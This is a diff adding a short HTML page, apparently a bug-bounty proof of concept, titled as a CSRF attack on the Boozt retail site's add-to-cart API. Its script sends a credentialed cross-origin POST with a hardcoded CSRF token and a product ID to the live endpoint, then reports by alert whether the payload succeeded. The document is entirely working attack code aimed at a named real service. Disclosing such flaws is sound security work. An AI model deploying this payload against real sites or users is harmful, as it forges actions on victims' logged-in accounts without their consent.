@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>CSRF PoC — Boozt Add to Cart</h1>
+    <script>
+      fetch("https://www.boozt.com/eu/en/api/shopcart/item", {
+        method: "POST",
+        credentials: "include",
+        headers: {
+          "Content-Type": "application/json",
+          "Csrf-Token": "01ff64e474d577c886c77891ee264bbc"
+        },
+        body: JSON.stringify({
+          eanId: "229348277",
+          quantity: 1,
+          itemsParameters: {}
+        })
+      })
+      .then(response => {
+        if (response.ok) {
+          alert("CSRF payload sent successfully!");
+        } else {
+          alert("CSRF attempt failed. Status: " + response.status);
+        }
+      });
+    </script>
+  </body>
+</html>
